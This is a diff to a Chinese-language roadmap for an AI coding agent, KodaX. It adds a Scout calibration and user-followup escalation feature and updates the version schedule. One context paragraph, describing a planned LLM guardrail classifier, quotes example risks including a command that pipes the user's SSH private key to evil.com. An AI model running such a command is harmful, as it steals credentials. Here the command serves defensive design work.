@@ -13,13 +13,13 @@
 
 | Item | Value |
 |---|---|
-| Tracked feature IDs | `001-102` (026 removed) |
-| Total tracked features | `101` |
+| Tracked feature IDs | `001-103` (026 removed) |
+| Total tracked features | `102` |
 | Completed | `80` |
 | Cancelled | `2` |
 | Absorbed | `2` |
 | InProgress | `1` |
-| Planned | `16` |
+| Planned | `17` |
 | Current released version | `v0.7.27` |
 
 ### 各版本待做分布
@@ -27,7 +27,7 @@
 | Version | Planned features |
 |---|---|
 | `v0.7.28` | `2` |
-| `v0.7.29` | `2` |
+| `v0.7.29` | `3` |
 | `v0.7.30` | `1` |
 | `v0.7.31` | `2` |
 | `v0.7.32` | `1` |
@@ -56,6 +56,7 @@
 | `088` | Self-Construction Tier 2 — Tool Generation | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_088-self-construction-tier-2--tool-generation) |
 | `100` | SA Runner Frame Adoption & Capability Unification | Internal / Refactor | Critical | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) |
 | `078` | Role-Aware Reasoning Profiles | Internal | High | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_078-role-aware-reasoning-profiles) |
+| `103` | Scout Calibration & L5 User-Followup Escalate | Internal | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate) |
 | `060` | Claude-Aligned Bounded-Memory Runtime and OOM Hardening | Internal | High | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_060-claude-aligned-bounded-memory-runtime-and-oom-hardening) |
 | `101` | Constructed Agent Admission Contract — Quality Invariants & 5-Step Manifest Vetting | Core / Safety Substrate | Critical | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_101-constructed-agent-admission-contract) |
 | `089` | Self-Construction Tier 3 — Agent Generation | Core | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_089-self-construction-tier-3--agent-generation) |
@@ -106,7 +107,8 @@
 - `FEATURE_101 + FEATURE_089` 合并在 **v0.7.31** 落地：101 是横切 **Constructed Agent Admission Contract**（quality invariant 三段 hook 模型 + 5 步 manifest 审核 + capability tier + clamp/retry/fallback 多级回退），把 LLM 生成的 manifest 当作 untrusted declaration 在 Runner 入口验证；089 是它的首个消费者（agent generation stage→activate 通道全部走 admission）。合并理由：admission contract 是横切基础设施，089/090/092/094 都消费它，单独成 feature 比埋在 089 里更符合它的地位；同版本同步交付能让 admission 的 schema/eval 指标在 089 真实流量下稳定一轮，再考虑晋升 ADR-021。
 - `FEATURE_090`（v0.7.32）**保持独立**：让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。manifest 热替换走 FEATURE_101 同一 admission 通道。单独成版本便于出问题时 rollback。
 - `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
-- **整体时序锁定（Plan B + 092 + 100）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → **v0.7.29 (100 + 078, SA Runner Frame Adoption + Role-Aware Reasoning Profiles — 078 撤回顺延 2026-04-27)** → **v0.7.30 (existing 057+060)** → v0.7.31 (101+089) → v0.7.32 (090) → v0.7.33 (092)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；**100 需 084+085 到位（hard）；078 / 089 / 090 / 092 / 094 都需 100 到位（hard）—— Agent declaration 上的 reasoning slot、Runner 级 guardrail 注册栈、`Runner.run(constructedAgent, ...)` 调用链、manifest hot-swap 的 Runner lifecycle 边界，全部依赖 SA 路径已进入 Runner 帧**；**092 需 085 到位**（不能前移到 0.7.26 之前）。0.8.0 之后不规划。
+- `FEATURE_103` (v0.7.29) 是在 v0.7.29 落 FEATURE_078 期间发现的两个 calibration 问题的合并修正：(1) Scout profile `default: quick → balanced` / `max: balanced → deep`——Scout 自 v0.7.16 FEATURE_061 起已不是单纯分类器，承担 H0/H1/H2 级联决策 + executionObligations + downstream_reasoning_hint 的 meta-reasoning，地板应该和 SA / Generator / Planner / Evaluator 一致是 balanced 而不是分类器时代沿用的 quick；(2) 在 FEATURE_078 的 L1-L4 链上加第 5 层 L5 user-followup escalate——任务边界处用户表达怀疑（"这个不对吧"）或加深要求（"仔细分析"）时单步升档，与 L4（任务内 Evaluator-revise 升档）形成"系统自检 + 用户施压"双轨。doubt 类别要求 prior assistant turn（防 false-positive），deepen 类别不要求；off 是 sacrosanct kill switch；deep 是 fixed point；不直接跳 max（多步可达，避免一次用完头寸）。详见 [v0.7.29 FEATURE_103 设计](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate)。
+- **整体时序锁定（Plan B + 092 + 100）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → **v0.7.29 (100 + 078 + 103, SA Runner Frame Adoption + Role-Aware Reasoning Profiles + Scout Calibration & L5 Followup Escalate)** → **v0.7.30 (existing 057+060)** → v0.7.31 (101+089) → v0.7.32 (090) → v0.7.33 (092)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；**100 需 084+085 到位（hard）；078 / 089 / 090 / 092 / 094 都需 100 到位（hard）—— Agent declaration 上的 reasoning slot、Runner 级 guardrail 注册栈、`Runner.run(constructedAgent, ...)` 调用链、manifest hot-swap 的 Runner lifecycle 边界，全部依赖 SA 路径已进入 Runner 帧**；**092 需 085 到位**（不能前移到 0.7.26 之前）。0.8.0 之后不规划。
 - `FEATURE_097` 是 v0.7.34 的独立 UX 增强：在 AMA spinner 下方新增 Claude Code 风格的实时计划列表（TodoListSurface 组件），用可视化的 pending / in_progress / completed / failed / skipped 状态展示 Scout 在入口阶段生成的 `executionObligations[]`。**决策点**：**不**按 H0/H1/H2 复杂度硬编码折叠显示；参照 Claude Code 做法，由 Scout 自主决定是否产出 obligations —— 1 条或 0 条时直接不渲染（简单任务自然不干扰），2+ 条统一展开。所有 obligations 完成后 5 秒延迟隐藏。数据流复刻 FEATURE_086 (`onRepoIntelligenceTrace`) 管线：新增 `KodaXEvents.onTodoUpdate` 回调 + 新增 `TodoUpdate` 工具（Generator/Planner 可主动推进状态）+ Evaluator verdict 自动收尾。**依赖**：FEATURE_084 (v0.7.26) 重写完成后的 Scout executionObligations 契约稳定形态；FEATURE_086 (v0.7.27) 前缀清理后的干净命名（避免在工具/类型重命名期间双轨维护）。**不做**：fs 持久化 / 依赖图 / 跨进程 swarm 共享（Claude Code V2 级别的重型基础设施，KodaX 单进程不需要）。
 - `FEATURE_095` **Absorbed into FEATURE_057（v0.7.30）Track F**：原计划 v0.7.39 单独成版本的"ink substrate cell-level diff 渲染管线重写"。实地核对 057 现状发现 `packages/repl/src/tui/core/` 已经落了 `screen.ts`（transcript-row 级 `TranscriptScreenBuffer`，非 cell 级）/ `selection.ts` / `hit-test.ts` / `termio.ts`（alt-screen + mouse-tracking）/ `scroll.ts` / `renderer.ts` / `engine.js` 等模块；057 设计稿 §10 renderer-native selection（要求"screen-buffer coordinates + hit-testing against rendered DOM rectangles"）、§11 ScrollBox parity（要求"viewport culling tied to renderer's layout pass"）都依赖 cell-level buffer，而该 buffer 是 095 设计稿的核心产物。两者不是兄弟，而是同一个重构故事的上下层。**合并后的 057 Track F**：在 `packages/repl/src/tui/substrate/ink/` 下引入 `cell-screen.ts`（避免与 `tui/core/screen.ts` 的 `TranscriptScreenBuffer` 撞名）、`frame.ts`、`csi.ts`、`osc.ts`；把 `substrate/ink/log-update.js` 与 `core/internals/log-update.js` 从 `createStandard / createIncremental` 字符串级重写成 `LogUpdate.render(prevFrame, nextFrame)` 类，统一走 cell-level diff + 绝对坐标光标。**SSH 闪烁根因更新**：原设计稿假设根因是 full-redraw 模式本身；实地用 `KODAX_TEE_STDOUT` 诊断后确认**真实根因是 `engine.js` altScreen 分支内 `this.log.clear() + this.log(fullFrameOutput)` 两次独立 stdout.write 拆帧**——中间 1~2ms ConPTY 把"屏幕清空"中间态 flush 给客户端就闪。该点已通过合并为单次 `this.log.clearAndRender(fullFrameOutput)` 的 10 行补丁消除（log-update 内部 eraseLines + content 以单次原子 write 发出），不再需要等 Track F 才能恢复 SSH 可用性。Track F 的剩余动机（TextInput 光标漂移根治、每帧字节量降至差异级、为 057 §10/§11 提供 cell buffer 基础）仍然成立，但紧迫性从"阻断 SSH 使用"降级为"TUI 质量提升"。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。
 
